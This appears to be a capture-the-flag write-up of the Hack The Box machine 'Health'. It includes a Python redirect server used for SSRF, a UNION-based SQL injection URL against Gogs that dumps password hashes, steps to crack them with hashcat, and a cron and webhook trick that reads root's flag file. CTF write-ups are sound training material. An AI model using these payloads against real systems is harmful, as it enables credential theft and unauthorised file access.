---
title: "HTB - Health"
date: 2023-03-11T18:19:48+01:00
draft: false
tags: [HTB, Medium, Linux, mysql, ssrf, gogs, LFI ]
---

## Foothold
### Nmap
```
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)  
| 256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)  
|_ 256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: HTTP Monitoring Tool  
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Classic box with filtered port on *3000*

SSRF on webhook app:

We can use this script to exploit the vuln:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

We discover a *Gogs* service running on the port *3000*. We can exploit it using a known CVE. Redirecting the request on this url, we can execute SQL code:
````txt
http://127.0.0.1:3000/api/v1/users/search?q=%27)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--
````


## User

We got an user `susanne` with a salt `sO3XIbeW14` and a password `66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37`

By looking at the *gogs* source code we see that the salt needs to be converted in base64 before cracking the password.

```
> echo "sO3XIbeW14" | base64 | cut -c1-14                                                                    
c08zWEliZVcxNA
```

In order to crack the password we need to convert it first in in a binary format then convert it in base64

```
> echo "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37" | xxd -r -p | base64
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

Using hascat on the hash we can crack the password: `february15`

We can now login on ssh using the password 

got user.txt

## LPE

We access the mysql creds in the .env inside the code folder

Cron job : `TRUNCATE` of table `tasks` ran as root.

We can modify the table and add `file:///root/root.txt` and create a webhook 